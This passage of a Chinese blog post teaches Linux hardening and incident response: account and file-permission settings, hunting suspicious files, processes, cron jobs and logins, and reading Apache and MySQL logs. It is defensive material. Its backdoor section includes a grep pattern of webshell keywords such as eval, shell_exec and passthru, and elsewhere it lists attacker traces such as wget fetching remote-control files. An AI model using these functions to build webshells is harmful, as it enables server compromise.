用户密码到期前，提示收到警告的天数</span><br><span class="line"> -E 账号到期的日期。过了这天，此账号将不可用</span><br><span class="line"> -d 上一次更改的日期</span><br><span class="line"> -i 停滞时期。如果一个密码已过期这些天，那么此账号将不可用</span><br><span class="line"> </span><br><span class="line"> Example:</span><br><span class="line">  <span class="comment"># change -M 90 root</span></span><br></pre></td></tr></table></figure><h2 id="二、文件系统安全"><a href="#二、文件系统安全" class="headerlink" title="二、文件系统安全"></a>二、文件系统安全</h2><p>chattr命令给下面的文件加上不可更改属性，从而防止非授权用户获得权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +i /etc/passwd</span><br><span class="line">chattr +i /etc/shadow</span><br><span class="line">chattr +i /etc/group</span><br><span class="line">chattr +i /etc/gshadow</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205081556938.png" alt="image-20220508155636437"></p><h2 id="三、身份标识和验证"><a href="#三、身份标识和验证" class="headerlink" title="三、身份标识和验证"></a>三、身份标识和验证</h2><blockquote><p>Linux系统的登录过程</p></blockquote><p>基于用户名和口令</p><p>通过终端登录Linux的过程：</p><p>Init进程确保为每个终端连接（或虚拟终端）运行一个getty进程，getty进程监听对应的终端并等待用户登录，Getty输出一条欢迎信息（此信息保存在&#x2F;etc&#x2F;issue文件中），并提示用户输入用户名，接着getty激活login要求用户输入口令，并根据系统中的&#x2F;etc&#x2F;passwd文件来检查用户和口令的一致性，若一致，则启动一个shell；否则login进程退出，进程终止</p><p>Init进程注意到login进程终止，则会再次为该终端启动getty进程</p><p>&#x2F;etc&#x2F;passwd文件用来维护系统中每个合法用户的信息，包括用户名登录、经过加密的口令、口令实现、用户UID、用户组号GID、用户主目录以及用书使用的shell</p><p>加密后的口令也可能存放在系统的&#x2F;etc&#x2F;shadow文件中</p><blockquote><p>Linux的主要账号管理文件</p></blockquote><p><strong>&#x2F;etc&#x2F;passwd文件</strong></p><p>口令文件&#x2F;etc&#x2F;passwd用于存放用户的基本信息，每个账户在该文件中有一个相应的条目</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091409058.png" alt="image-20220509140924117"></p><p>每个条目包含7个字段，字段间用冒号分隔</p><p><code>登录账号:密码域:UID:GID:用户信息:主目录:用户shell</code></p><p>登录账号：用户登录名</p><p>密码域：口令被加密后的密文</p><p>UID，用户ID，为0~MAXINT-1之间的一个整数</p><p>GID，组ID，来自&#x2F;etc&#x2F;group，为0~MAXINT-1之间的一个整数</p><p>用户信息，用于标识诸如用户的全名、位置和电话号码等信息，可以不设置</p><p>主目录，为用户起始的登录目录，如&#x2F;home&#x2F;username</p><p>用户shell，用户登录后使用的shell路径名，比如&#x2F;bin&#x2F;sh</p><p><strong>用户可以修改口令条目中的部分信息：</strong></p><p>命令<code>passwd</code>：更改口令</p><p>命令<code>chfn</code>：改改第五个字段中的信息</p><p>命令<code>chsh</code>：更改第七个字段，shell路径名</p><p>其余的字段由息系统管理员设置</p><p><strong>&#x2F;etc&#x2F;shadow文件</strong></p><p>口令加密后的文件存放在<code>/etc/shadow</code>文件中，在&#x2F;etc&#x2F;passwd文件中的密码域只保存一个”x”</p><p>Shadow文件对于一般用户是不可读的，只有超级用户（root）才可以读写。</p><p>由于普通用户无法得到加密后的口令，提高了系统的安全性。</p><p>&#x2F;etc&#x2F;shadow文件中每行9个字段，也以冒号分隔</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091418013.png" alt="image-20220509141820714"></p><p>登录账号：与&#x2F;etc&#x2F;passwd中的登录账号对应</p><p>密文：若值为x，标识该用户不能拿登录到系统</p><p>上次口令的修改时间：自1970.1.1日以来的天数</p><p>两次修改口令间隔最少的天数：0</p><p>两次修改口令间隔最多的天数：9999</p><p>在口令过期之后多少天禁用此用户：7</p><p>用户过期日期：若空则为永久可用</p><p>保留字段：</p><blockquote><p>PAM安全验证机制</p></blockquote><p>功能包括：<br>加密口令（包括DES和其他加密算法）</p><p>对用户进行资源限制，防止DOS攻击</p><p>允许随意Shadow口令</p><p>限制特定用户在指定时间从指定地点登录</p><h2 id="四、Linux网络安全"><a href="#四、Linux网络安全" class="headerlink" title="四、Linux网络安全"></a>四、Linux网络安全</h2><ol><li><p>仔细设置每个内部用户的权限</p></li><li><p>确保用户口令文件&#x2F;etc&#x2F;shadow的安全</p></li><li><p>加强对系统运行的监控和记录</p></li><li><p>合理划分子网和设置防火墙</p></li><li><p>定期对Linux网络进行安全检查</p></li><li><p>指定适当的数据备份计划避免数据丢失</p></li><li><p>加强对Linux网络服务的管理，合理使用各种工具</p><p>(1) 慎用Telnet服务</p><p>(2) 合理设置NFS服务和NIS服务</p><p>(3) 小心配置FTP服务</p><p>(4) 合理设置POP3和Sendmail等电子邮件服务</p><p>(5) 加强对WWW服务器的管理，提供安全的WWW服务</p><p>(6) 最好禁止finger服务</p></li></ol><h2 id="五、文件排查"><a href="#五、文件排查" class="headerlink" title="五、文件排查"></a>五、文件排查</h2><p>敏感目录的文件分析[临时&#x2F;tmp目录、可执行程序目录&#x2F;usr&#x2F;bin &#x2F;usr.sbin等]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -a显示所有档案及目录（ls默认将文件或者目录名称为 &quot;.&quot; 的视为隐藏文件或目录，不会列出）；</span><br><span class="line"> -l以长格式显示目录下的内容列表。输出的信息从左到右依次包括文件名，文件类型，权限模式，硬连接数、搜有着、组、文件大小和文件最后修改时间等；</span><br><span class="line"> -t按修改时间顺序从近到远排序</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091432584.png" alt="image-20220509143243050"></p><p>针对可以文件可以使用<code>stat</code>进行创建时间、修改时间、访问时间的详细查看，若修改时间距实现日期接近，有线性关联，说明可能被篡改或其他。</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101629711.png" alt="image-20220510162918705"></p><p>（1）Access Time：简写为atime，表示文件的访问时间。当文件内容被访问时，更新这个时间</p><p>（2）Modify Time：简写为mtime，表示文件内容的修改时间，当文件的数据内容被修改时，更新这个时间。</p><p>（3）Change Time：简写为ctime，表示文件的状态时间，当文件的状态被修改时，更新这个时间，列如文件链数，大小，权限，Blocks数。</p><blockquote><p>用户操作记录</p></blockquote><p>查看历史命令记录文件<code>~/.bash_history（或者.zsh_history）</code>。</p><p>查找<code>~/.bash_history</code>命令执行记录，主要分析时是否有账户执行过恶意代码；只要用户执行过命令，那么在这个用户HOME目录下，都会有一个.bash_history的文件记录着这个用户都执行过什么命令;</p><p>当前执行的命令不会同步记录，只有退出当前bash的时候，才会把当前bash历史命令记录下来</p><blockquote><p>追溯异常用户执行命令</p></blockquote><p>通过&#x2F;etc&#x2F;passwd文件，我们可以尝试查找有没有攻击者所创建的用户，或存在异常的用户，我们主要关注的是第3,4列用户标识号和组标识号，和倒数一二列的用户主目录和命令解析程序。一般来说最后一列命令解析程序如果设置为nologin的话，那么标识这个用户是不可登录的，所以结合.bash_history文件的排查方法。</p><p>首先在&#x2F;etc&#x2F;passwd中查找命令届时程序不是nologin的用户，然后再找到这些用户的主目录，找到.bash_history，去查看这个用户是否执行过恶意命令</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091445303.png" alt="image-20220509144510522"></p><p>查看新增文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find：在指定目录下查找文件</span><br><span class="line">-typeb/d/c/p/l/f查找类型为：块设备、目录、字符设备、管道、符号链接、普通文件</span><br><span class="line">-mtime -n +n按文件更改时间来查找文件，-n指n天以内，+n指n天前</span><br><span class="line">-atime -n +n按文件访问时间来查找文件，-n指n天以内，+n指n天以前</span><br><span class="line">-ctime -n +n按文件创建时间来查找文件，-n指n天以内，+n指n天前</span><br></pre></td></tr></table></figure><p>特殊权限的文件查看：</p><p>查找777的权限的文件 find &#x2F; -perm 777</p><p>隐藏的文件（以 *.* 开头的具有隐藏属性的文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">grep [Options] &lt;目录&gt;</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -v相反匹配 invert match</span><br><span class="line"> -i 不区分大小写 ignore caase</span><br><span class="line"> -r 递归查找</span><br><span class="line"> -R查找所有文件包含子目录</span><br><span class="line"> *表示当前目录所有文件，也可以是某个文件名</span><br></pre></td></tr></table></figure><p>在文件分析过程中，手工排查使用频繁率较高的命令是<code>find grep ls</code>核心目的是为了关联推理出可疑文件；</p><p>此外命令还有<code>sort uniq</code>等</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091501997.png" alt="image-20220509150143585"></p><h2 id="六、进程排查"><a href="#六、进程排查" class="headerlink" title="六、进程排查"></a>六、进程排查</h2><p>查看分析任务计划</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">crontab -u [Options]</span><br><span class="line"></span><br><span class="line">Options：</span><br><span class="line"> -u指定一个用户</span><br><span class="line"> -l列出某个用户的任务计划</span><br><span class="line"> -r删除某个用户的任务</span><br><span class="line"> -e编辑某个用户的任务（编辑的是/var/spool/cron下对应用户的cron文件，也可以直接修改/etc/crontab文件）</span><br><span class="line"> </span><br><span class="line"> Usage：</span><br><span class="line"> crontab -u root -l# 查看root用户的任务计划</span><br><span class="line"> crontab -l# 查看当前的任务计划</span><br></pre></td></tr></table></figure><p>查看etc目录任务计划相关文件<code>ls /etc/cron</code></p><p>用netstat网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">netstat [Options]</span><br><span class="line">用来显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检测本级各端口的网络连接情况。</span><br><span class="line"></span><br><span class="line">Options：</span><br><span class="line"> -a显示所有连线中的Socket</span><br><span class="line"> -n直接使用IP地址，而不是通过域名服务</span><br><span class="line"> -t显示TCP传输协议的链接状况</span><br><span class="line"> -u显示UDP传输协议的连接状况</span><br><span class="line"> -v 显示指令执行过程</span><br><span class="line"> -p显示正在使用Socket的程序识别码和应用程序</span><br><span class="line"> -s显示网络工作信息统计表</span><br><span class="line"> -l显示监控中的服务器的Socket</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091513019.png" alt="image-20220509151349901"></p><p>Proto显示连接使用的协议；</p><p>Recv-Q 和 Send-Q 值的是接受队列和发送队列；</p><p>State显示套接口当前的状态（LISTENING：侦听状态、ESTABLISHED：建立链接、CLOSE_WAIT：对方主动关闭连接或网络异常导致连接中断）；</p><p>Path标识连接到套接口的其他进程使用的路径名。</p><p>根据netstat 定位出的pid，使用<code>ps aux|grep [pid]</code>命令，分析进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ps [Options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -a代表all。同时加上x参数会显示没有控制终端的进程</span><br><span class="line"> -aux显示所有包含其他使用者的进程（ps -aux --sort -pcpu|less 根据cpt使用率进行排序）</span><br><span class="line"> -C显示某个进程的信息</span><br><span class="line"> -axjf以树桩结构显示进程</span><br><span class="line"> -e显示所有进程，和 -A 相同</span><br><span class="line"> -f额外全格式</span><br><span class="line"> -t ttylist by tty显示终端id在ttylist列表中的进程</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091521171.png" alt="image-20220509152151304"></p><p>除此之外还有性能分析工具<code>top</code>，能实时显示各个进程的资源占用情况。</p><p>隐藏进程查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | awk &#x27;&#123;print $2&#125;&#x27; | sort -n | uniq&gt;1</span><br><span class="line">ls /proc | sort -n | uniq&gt;2</span><br><span class="line">diff 1 2</span><br></pre></td></tr></table></figure><p>unhide工具：可以使用unhide工具查看一些可能的rookit，主要是针对进程和网络连接隐藏的rookit</p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release</span><br><span class="line">yum -y install unhide</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091530746.png" alt="image-20220509153027803"></p><h2 id="七、日志排查"><a href="#七、日志排查" class="headerlink" title="七、日志排查"></a>七、日志排查</h2><p>气yslog 或 &#x2F;etc&#x2F;syslogd 或 &#x2F;etc&#x2F;rsyslog.d</p><p>&#x2F;etc&#x2F;syslog.conf 或者 rsyslog.conf</p><p>Linux日志默认配置文件为 <code>/etc/syslog.conf</code> 或 <code>rsyslog.conf</code>，任何希望生成日志的程序都可以向 syslog 发送信息。</p><p>syslog可以根据日志的类别和优先级将日志保存到不同的文件中。</p><p>常见应急日志类型：</p><table><thead><tr><th align="center">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">auth</td><td align="left">用户认证时产生的日志，如login、su命令</td></tr><tr><td align="center">authpriv</td><td align="left">与auth类似，但是只能被特定用户查看</td></tr><tr><td align="center">console</td><td align="left">针对系统控制台的消息</td></tr><tr><td align="center">cron</td><td align="left">系统定期执行计划任务时产生的日志</td></tr><tr><td align="center">daemon</td><td align="left">某些守护进程产生的日志</td></tr><tr><td align="center">ftp</td><td align="left">FTP服务</td></tr><tr><td align="center">kern</td><td align="left">系统内核信息</td></tr><tr><td align="center">mail</td><td align="left">邮件日志</td></tr><tr><td align="center">mark</td><td align="left">产生时间戳。系统每隔一段时间向日志文件中输出当前时间,每行的格式类似于 May 26 11:17:09 rs2 – MARK –，可以由此推断系统发生故障的改时间</td></tr><tr><td align="center">news</td><td align="left">网络新闻传输协议（ntp）产生的消息</td></tr><tr><td align="center">ntp</td><td align="left">网络时间协议（ntp产生的消息）</td></tr><tr><td align="center">user</td><td align="left">用户进程</td></tr></tbody></table><p>日志优先级：</p><table><thead><tr><th align="center">优先级</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">emerg</td><td align="left">紧急情况，系统不可用（例如系统崩溃），一般会通知所有用户</td></tr><tr><td align="center">alert</td><td align="left">需要立即修复，例如系统数据库损坏</td></tr><tr><td align="center">crit</td><td align="left">危险情况，例如磁盘错误，可能会阻碍程序的部分功能</td></tr><tr><td align="center">err</td><td align="left">一般错误消息</td></tr><tr><td align="center">warning</td><td align="left">警告</td></tr><tr><td align="center">notice</td><td align="left">不是错误，但是可能需要处理</td></tr><tr><td align="center">Info</td><td align="left">通用性消息，一般用来提供有用信息</td></tr><tr><td align="center">debug</td><td align="left">调试程序产生的信息</td></tr><tr><td align="center">none</td><td align="left">没有优先级，不记录任何日志信息</td></tr></tbody></table><p>常用日志文件</p><table><thead><tr><th>日志目录</th><th>作用</th></tr></thead><tbody><tr><td>&#x2F;var&#x2F;log&#x2F;message</td><td>包括整体系统信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;auth.log</td><td>包含系统授权信息，包括用户登录和使用权限极致等</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;userlog</td><td>记录所有等级用户信息的日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;cron</td><td>记录crontab命令是否被正确执行</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;vsftpd.log</td><td>记录Linux FTP日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;lastlog</td><td>记录登录的用户，可以使用lastlog查看</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;secure</td><td>记录大多数应用输入的账号与密码，登录成功与否</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;wtmp</td><td>记录登录系统成功的大账户信息，等同于命令last</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;faillog</td><td>记录登录系统不成功的账户信息，一般会被黑客删除</td></tr></tbody></table><p>日志配置：<br>linux系统日志相关配置文件为 &#x2F;etc&#x2F;rsyslog.conf（syslog.conf），以下是对配置文件各项配置;</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091612914.png" alt="image-20220509161243906"></p><p>日志分析：</p><p>日志查看分析，主要为<code>grep,sed,sort,awk</code>的综合运用</p><p><code>cat -n test.log | grep &quot;xxx&quot; -v</code># 不匹配xxx</p><p><code>sed -n &#39;/2014-12-17 16:17:20/,/2014-12-17 16:17:36/p&#39; test.log</code></p><p>可以使用日志分析工具；为了在现场快速排查，日志量少或者不方便导出文件用手工查看。</p><blockquote><p>&#x2F;var&#x2F;log&#x2F;wtmp</p></blockquote><p>&#x2F;var&#x2F;log&#x2F;wtmp是一个二进制文件，记录每个用户的登录次数和持续时间等信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">last命令用于显示用户最近登录信息。单独执行last命令，他会读取/var/log/wtmp的文件，并把该文件的内容记录的登入系统的用户名单全部显示出来：</span><br><span class="line"></span><br><span class="line">last [Options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -f:&lt;记录文件&gt;:指定记录文件</span><br><span class="line"> -a把从何处登入系统的主机名称或者IP地址，显示在最后一行</span><br><span class="line"> </span><br><span class="line">Usage：</span><br><span class="line"> last -f/var/log/wtmp -a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091715205.png" alt="image-20220509171543208"></p><blockquote><p>&#x2F;var&#x2F;run&#x2F;utmp</p></blockquote><p>&#x2F;var&#x2F;run&#x2F;utmp是一个二进制文件，记录当前登录系统的用户信息。可用who命令显示当中的内容，who的缺省输出包括用户名、终端类型、登录日期及远程主机；</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091715421.png" alt="image-20220509171459936"></p><blockquote><p>&#x2F;var&#x2F;log&#x2F;lastlog(lastlog)</p></blockquote><p>&#x2F;var&#x2F;log&#x2F;lastlog记录用户最后登录的时间和登录终端的地址，可使用lostlog命令查看；</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205091717868.png" alt="image-20220509171700036"></p><blockquote><p>&#x2F;var&#x2F;log&#x2F;btmp(lastb)</p></blockquote><p>&#x2F;var&#x2F;log&#x2F;btmp记录错误登录的日志，可使用lastb查看，有很多黑客试图用密码字典登录ssh服务，可以使用此日志文件查看恶意ip试图登录次数</p><p>登录日志可以关注Accept、Failed password、Invalid特殊关键字；</p><blockquote><p>&#x2F;var&#x2F;log&#x2F;secure</p></blockquote><p>在有些发行版的linux系统中是&#x2F;var&#x2F;log&#x2F;auth.log</p><p>安全日志secure包含验证和授权方面的信息，比如最常用的远程管理协议ssh，就会把所有授权信息都记录在这里。所以通过查看日志，我们就能查看是否有人爆破ssh，通过查看存在过爆破记录的ip是否有成功登录的行为,我们就能知道是否有攻击者通过ssh暴力破解的方式进入过服务器。通过时间的维度去判断，可以查出是机器行为还是认为的，机器登录时间间隔特别密；</p><p>主要分析点：是否有ip爆破ssh成功（<code>cat /var/log/secure | grep Accept</code>）</p><p>定位有多少IP在爆破主机的root账号：</p><p><code>grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101017443.png" alt="image-20220510101734159"></p><p>登录成功的IP有哪些</p><p><code>grep &quot;Accept&quot; /var/log/secure| awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</code> </p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101635984.png" alt="image-20220510163518979"></p><h2 id="八、Apache日志"><a href="#八、Apache日志" class="headerlink" title="八、Apache日志"></a>八、Apache日志</h2><p>Apache日志字段说明：</p><table><thead><tr><th align="left">字段</th><th>说明</th></tr></thead><tbody><tr><td align="left">远程主机IP</td><td>表明是谁访问了网站</td></tr><tr><td align="left">空白（E-mail）</td><td>为了避免用户的邮件被垃圾邮件骚扰，第二项就用“-”取代了</td></tr><tr><td align="left">空白（登录名）</td><td>用于记录浏览者进行身份验证时提供的名字</td></tr><tr><td align="left">请求时间</td><td>用方括号包围，而且采用“公用日志格式”或者“标准英文格式”。时间信息最后的“+0800”表示服务器所处时区位于UTC之后的8小时</td></tr><tr><td align="left">方法<br />资源<br />协议</td><td>请求的方式：METHOD、GET、POST、HEAD等<br />请求的文件<br />请求的协议：HTTP+版本号</td></tr><tr><td align="left">状态码</td><td>请求的状态码</td></tr><tr><td align="left">发送的字节数</td><td>表示发送给客户端的总字节数。它告诉我们传输是否被打断（该数值和文件大小相同）</td></tr><tr><td align="left">Referer</td><td>从哪个页面链接过来的</td></tr><tr><td align="left">User-Agent</td><td>客户端使用的操作系统及版本、CPU类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等信息。</td></tr></tbody></table><p>Apache默认自动生成两个日志文件，访问日志access_log和error_log；</p><p>查询访问量前10的IP地址：</p><p><code>cat /var/log/httpd/access_log | cut -f 1 -d &#39; &#39; | sort | uniq -c | sort -k 1 -n -r | head -10</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101045908.png" alt="image-20220510104513040"></p><p>查询访问量前十的URL：（不存在的页面也会被记录）</p><p><code>cat /var/log/httpd/access_log | cut -f 7 -d &#39; &#39; | sort | uniq -c | sort -k 1 -n -r | head -10</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101050336.png" alt="image-20220510105028031"></p><p>查看访问量前十QPS的时间点：</p><p><code>cat /var/log/httpd/access_log | cut -f 4 -d &#39; &#39; | sort | uniq -c | sort -k 1 -n -r | head -10</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101636901.png" alt="image-20220510163615313"></p><p>首先确定受到攻击、入侵的时间范围，以此为线索，查找这个范围内可以的日志，进一步排查，最终确定攻击者，还原攻击过程；</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101122529.png" alt="image-20220510112203635"></p><p>一般攻击者入侵网站后，通常会上传一个后门文件，以方便自己以后访问，我们也可以以该文件为线索来展开分析；</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101304601.png" alt="image-20220510130418254"></p><h2 id="九、MySQL日志"><a href="#九、MySQL日志" class="headerlink" title="九、MySQL日志"></a>九、MySQL日志</h2><p>数据库数据日志以常用的数据库Mysql数据库为例。Mysql数据库有五种日志，错误日志、查询日志、慢查询日志、更新日志、二进制日志，重点关注查询日志；</p><p>查询是否开启查询日志；</p><p><code>show variables like &#39;%general&#39;;</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101535262.png" alt="image-20220510153346256"></p><p>查看日志表中的操作；</p><p>cat &#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql.log | grep SELECT</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101535519.png" alt="image-20220510153442051"></p><h2 id="十、系统信息排查"><a href="#十、系统信息排查" class="headerlink" title="十、系统信息排查"></a>十、系统信息排查</h2><blockquote><p>查看分析history（cat &#x2F;root&#x2F;.bash_history），曾经的命令操作痕迹，以便进一步排查溯源。运气好有可能通过记录分析到如下信息：</p></blockquote><ol><li><p>wget 远程某主机（域名&amp;IP）的远控文件；</p></li><li><p>尝试连接内网某主机（ssh scp），便于分析攻击者意图；</p></li><li><p>打包某敏感数据或代码，tar zip类命令</p></li><li><p>对系统进行配置，包括命令修改、远控木马类，可找到攻击者相关信息…</p></li></ol><p>查看Linux开机启动程序</p><p>查看rc.local文件（&#x2F;etc&#x2F;init.d&#x2F;rc.local &#x2F;etc&#x2F;rc.local）</p><p>ls -alt &#x2F;etc&#x2F;init.d&#x2F;</p><p>chkconfig是管理系统服务（service）的命令行工具，对开机启动的可以程序进行更改；</p><p>设置server启动个信息：</p><p><code>chkconfig name on/off/reset</code></p><p>设置service运行级别：</p><p><code>chkconfig --level [levels]</code></p><blockquote><p>查看shell的配置文件 .bashrc 和 .bash_profile 等文件是否有恶意alias问题</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101543575.png" alt="image-20220510154335724"></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101543561.png" alt="image-20220510154350149"></p><p>&#x2F;etc&#x2F;profile：此为系统的每个用户设置环境变量，当用户第一次登录时，该文件被执行，并从 &#x2F;etc&#x2F;profile.d 目录的配置文件中收集shell的设置</p><p>&#x2F;etc&#x2F;bashrc：为每一个运行bash shell的用户执行此文件，当bash shell被打开时，该文件被读取</p><p>~&#x2F;.bash_profile：每个用户都可以使用该文件输入专用于自己使用的shell信息，当用户登录时，该文件仅仅执行一次，默认情况下，他设置一些环境变量，执行用户的.bashrc文件</p><p>~&#x2F;.bashrc：该文件包含专用于你的bash shell的bash查信息，当登录时以及每次打开新的shell时，该文件被读取</p><p>~&#x2F;.bash_lotout：当每次退出系统（退出bash shell）时候，执行该文件</p><p>使用<code>lastlog</code>命令，查看系统中所有用户最近一次登录信息</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101553184.png" alt="image-20220510155340026"></p><p>使用<code>lastb</code>命令，用于显示用户错的登录列表；</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101554720.png" alt="image-20220510155433791"></p><p>utmp文件中保存的是当前正在本系统中的用户的信息</p><p>wtmp文件中保存的是登录过本系统的用户的信息</p><p>&#x2F;var&#x2F;log&#x2F;twmp 文件结构和 &#x2F;var&#x2F;run&#x2F;utmp 文件结构一样，都是引用 &#x2F;usr&#x2F;include&#x2F;bits&#x2F;utmp.h中的struct utmp;</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101558273.png" alt="image-20220510155825398"></p><p>echo $PATH 分析有无敏感可疑信息</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101559128.png" alt="image-20220510155919096"></p><p>指定信息检索</p><p>strings命令在对象文件或二进制文件中查找可打印的字符串；</p><p>分析文件中是否包含IP信息：<code>strings /var/run/utmp | grep &quot;[1-9]&#123;1,3&#125;.[1-9]&#123;1,3&#125;.&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101637170.png" alt="image-20220510163750097"></p><p><code>chkrootkit</code>、<code>rkhunter</code>等软件可以自动化一键排查一系列漏洞</p><h2 id="十一、后门排查"><a href="#十一、后门排查" class="headerlink" title="十一、后门排查"></a>十一、后门排查</h2><p>Webshell的排查可以通过文件、流量、日志三种方式进行分析，基于文件的命名特征合内容特征，相对操作性较高，在入侵后应急过程中频率也比较高。</p><ol><li>webshell的排查可以根据webshell特征命令查找，简单的可使用（当然后会存在漏洞和误报</li></ol><p><code>find /var/www/ -name &quot;*.php&quot; | xargs egrep &#39;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval\(str_rot13|\.chr\(|\$\&#123;&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$_|base64_decode&#39;</code></p><ol start="2"><li>Github上存在各种版本的webshell查杀脚本，各有各的特点，也可以使用河马shell查杀（shellpub.com）</li></ol><p>手工Webshell排查</p><p><code>find /var/www/html/ -type f -name &#39;*.php&#39;|xargs grep &#39;eval&#39;|more</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101639851.png" alt="image-20220510163900869"></p><p>预加载动态链接库后门</p><p>在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生劫持</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205101622068.png" 